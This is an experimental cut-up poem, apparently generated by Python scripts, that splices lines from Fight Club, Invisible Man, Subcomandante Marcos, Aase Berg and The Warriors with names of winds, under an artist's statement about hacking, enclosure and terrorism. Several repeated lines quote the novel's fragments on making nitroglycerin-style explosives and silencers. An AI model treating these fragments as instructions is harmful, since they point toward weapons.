#   The commonsense acceptance of the city at face value belies the complex and often contradictory dynamics which are operating beneath the surface. CYRUS.py is an experimental intertextual poetics + research tool exploring notions of counterpublic identity, enclosure, hacker practice and terrorism in metropolises/netropolises. CYRUS.py combines cherry-picked output from two different python scripts: one program generates cut-up texts drawn from five writings—Fight Club, Invisible Man, Professionals of Hope: The Selected Writings of Subcomandante Marcos, Hackers (by Aase Berg), and The Warriors original movie script. I have changed some names and places of the original writings to help develop a more unified narrative. In addition to the five writings mentioned, the program also draws from a Wikipedia list of local winds around the world. The other program generates spam-like strings of words/phrases flagged by the U.S. Department of Homeland Security. All of the code can be located here: https://www.dropbox.com/s/o641ney6mzgppcn/CYtools.zip?dl=0. CYRUS.py also includes extracts from various sources exploring the aforementioned topics.

We have much time on our hands.', 'I know this because Cyrus knows this. The one who walks the fog. And there’s over a hundred more.', 'I’m an invisible man and it placed me in a hole -- or showed me the hole I was in, if you will -- and I reluctantly accepted the fact. Indigenous brother, sister. But it is hardly heard.', 'The one who is desert. The one who shares the blood and idea. Here, the silence no longer.', 'I am like the Descuernacabras.', 'I am like the Diablo.', 'Mix the nitro with sawdust, and you have a nice plastic explosive. They received a feeling of security.

If you are an animal here you are either alive or dead.', '“Because I’m your destiny.” The Lord of the net. Civilization means to love fiercely.', 'You take a 98-percent concentration of fuming nitric acid and add the acid to three times that amount of sulfuric acid. So I took to the cellar; I hibernated.

Here, no longer shame for the color of our skin.', 'Cyrus says, “Get up.” Under and behind and inside everything I took for granted, something horrible has been growing. Wind Walked.', 'We walk the land. A glowing space-fly casts flitting silhouettes on a viscous surface. Nobody in this city could be safe outside his door.', 'The one who shares the idea. The man who is man. Either healthy and hearty or a bullet in your forehead.', 'So Cyrus and I are up on top of the Empire State Building with the gun stuck in my mouth. “Why should I know you?” My eye is the hand of violence.', 'I am like the Warm Braw.', 'Nothing explodes. It is a horse and it says No. What are you offering, for what are we paying this price.', 'I know this because Cyrus knows this. “You see me?” I said, watching him tensely. A cold planetary platform in the future tense through the woods.', 'We walk the land. The surface is still smooth, the final dynamics have not yet been awakened, they will take effect later when speeding vehicles pull up the headwind’s disappearing routes of jet-stream velocity. My eye is the hand of violence.', 'You drill the holes wrong and the gun will blow off your hand. It’s so quiet this high up, the feeling you get is that you’re one of those space monkeys. The turf is ours by right because it’s our turn.', '“This is our world, now, our world,” Cyrus says, “and those ancient people are dead.” We came here to give ourselves a name. The one who is painted in color.', 'It is sometimes advantageous to be unseen, although it is most often rather wearing on the nerves. The point now is that I found a home -- or a hole in the ground, as you will. The one who walks the fog.', 'This lets the gas escape and slows the bullet to below the speed of sound. I am neither dead nor in a state of suspended animation. The one who is person.', '(Beware of those who speak of the spiral of history; they are preparing a boomerang. Keep a steel helmet handy.) The one who works. ONE GANG COULD RUN THIS CITY.', 'The swift walker. The one who has word. Indigenous Brother, Sister: Non-indigenous Brother, Sister: We are here to say we are here.', 'They’re saying, “Wait.” Here, no longer shame for the color of our skin. We take over one borough at a time, secure our territory.', 'I am like the Washoe Zephyr.', 'I am like the Witch of November.', 'I am like the Roaring Forties.', 'Mix the nitro with sawdust, and you have a nice plastic explosive. A matter of the construction of their inner eyes, those eyes with which they look through their physical eyes upon reality. Civilization means to love fiercely.', 'It unnerved me. But I didn’t linger. We keep up with the general truce.', 'Without Adalia.exe, Cyrus would have nothing. The one who walks the night. It’s not horses you shut in, invade, kill.', 'Then too, you’re constantly being bumped against by those of poor vision. The embrace of the compañero. Silenced.', 'I know this because Cyrus knows this. It’s weird to think the place where we’re standing will only be a point in the sky. I am a man of substance, of flesh and bone, fiber and liquids -- and I might even be said to possess a mind.', 'The one who is desert. Inflated and hovering along foraging paths, the horse devours the world’s calm. Unless we say so.', 'This how-to stuff isn’t in any history book. I remember everything. For the horse, the glance pushes the world forward.', 'The embrace of the compañero. The one who speaks the right word. Inflated and hovering along foraging paths, the horse devours the world’s calm.', 'A matter of the construction of their inner eyes, those eyes with which they look through their physical eyes upon reality. I was both disgusted and ashamed. The man who is man.', 'Yes, full of light. A cold planetary platform in the future tense through the woods. The problem in the past has been the man turning us on one another.', 'You drill the holes wrong and the gun will blow off your hand. Here, the building’s standing. We come from very far away.', 'I know this because Cyrus knows this. If speed is the urge to get away, towards what. And the horror of white fire still burned in the staring eyes.', 'This how-to stuff isn’t in any history book. The one who shares the blood and idea. The traffic rules have not yet taken effect, and the right wind blows from the left.', 'To God, this looks like one man alone, holding a gun in his own mouth, but it’s Cyrus holding the gun, and it’s my life. We came here to be gazed upon. The one who is people of humble custom.', 'I’m killing Cyrus. The one who shares the blood and idea. Heavy, darkened vehicles will create black sneak routes of asphalt leading straight into the earth’s heart.', 'Under and behind and inside everything I took for granted, something horrible has been growing. “If you don’t cooperate, we’ll go after Adalia.exe.” The friction of slowly petrifying lava.', 'Nor do I know whether accepting the lesson has placed me in the rear or in the avant-garde.
